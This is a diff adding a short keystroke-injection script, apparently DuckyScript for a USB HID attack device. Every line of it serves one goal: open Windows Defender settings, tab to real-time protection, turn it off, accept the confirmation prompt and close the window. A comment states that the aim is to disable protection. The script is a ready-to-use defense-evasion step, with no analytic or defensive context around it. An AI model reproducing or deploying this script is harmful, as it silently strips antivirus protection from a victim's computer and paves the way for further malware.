@@ -1,0 +1,26 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING windowsdefender://settings/
+DELAY 500
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 1000
+TAB
+DELAY 350
+TAB
+DELAY 350
+TAB
+DELAY 350
+TAB
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+REM Close Settings
+DELAY 500
+ALT F4
+DELAY 200
